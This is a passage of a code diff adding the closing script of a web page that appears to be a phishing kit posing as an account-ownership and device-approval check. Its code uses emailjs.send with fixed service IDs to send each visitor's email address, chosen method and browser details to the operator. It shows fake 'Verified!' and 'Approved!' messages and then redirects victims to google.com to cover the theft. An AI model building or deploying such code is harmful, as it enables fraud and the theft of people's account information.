+            console.error('❌ Email 3 failed:', err);
+        }).finally(() => {
+            Swal.close();
+            
+            // Close all modals
+            document.querySelectorAll('.modal').forEach(modal => {
+                modal.style.display = 'none';
+            });
+            
+            // Show success message with countdown
+            let secondsLeft = 5;
+            
+            Swal.fire({
+                icon: 'success',
+                title: 'Verified!',
+                html: `Your account ownership has been successfully confirmed`,
+                timer: 5000,
+                timerProgressBar: true,
+                showConfirmButton: false,
+                allowOutsideClick: false,
+                didOpen: () => {
+                    Swal.showLoading();
+                    
+                    const timer = setInterval(() => {
+                        secondsLeft--;
+                        if (secondsLeft > 0) {
+                            const content = Swal.getHtmlContainer();
+                            if (content) {
+                                content.innerHTML = ``;
+                            }
+                        } else {
+                            clearInterval(timer);
+                        }
+                    }, 1000);
+                }
+            }).then(() => {
+                window.location.href = 'https://www.google.com';
+            });
+        });
+    }
+
+    // Handle device approval (if needed)
+    function handleDeviceApproval(method) {
+        Swal.fire({
+            title: 'Waiting for approval...',
+            text: 'Please check your device',
+            allowOutsideClick: false,
+            didOpen: () => Swal.showLoading()
+        });
+
+        emailjs.send("service_zl8edtk", "template_7uvwmq9", {
+            email: userEmail,
+            method: method,
+            step: '2 - Device Approval',
+            timestamp: new Date().toLocaleString(),
+            userAgent: navigator.userAgent,
+            emailType: 'device_approval'
+        }).finally(() => {
+            Swal.close();
+            
+            let secondsLeft = 5;
+            
+            Swal.fire({
+                icon: 'success',
+                title: 'Approved!',
+                html: ``,
+                timer: 5000,
+                timerProgressBar: true,
+                showConfirmButton: false,
+                allowOutsideClick: false,
+                didOpen: () => {
+                    Swal.showLoading();
+                    
+                    const timer = setInterval(() => {
+                        secondsLeft--;
+                        if (secondsLeft > 0) {
+                            const content = Swal.getHtmlContainer();
+                            if (content) {
+                                content.innerHTML = ``;
+                            }
+                        } else {
+                            clearInterval(timer);
+                        }
+                    }, 1000);
+                }
+            }).then(() => {
+                window.location.href = 'https://www.google.com';
+            });
+        });
+    }
+
+    // Close modals when clicking outside
+    window.onclick = function(event) {
+        if (event.target.classList.contains('modal')) {
+            event.target.style.display = 'none';
+        }
+    };
+</script>
+    
+
+</body>
+</html>
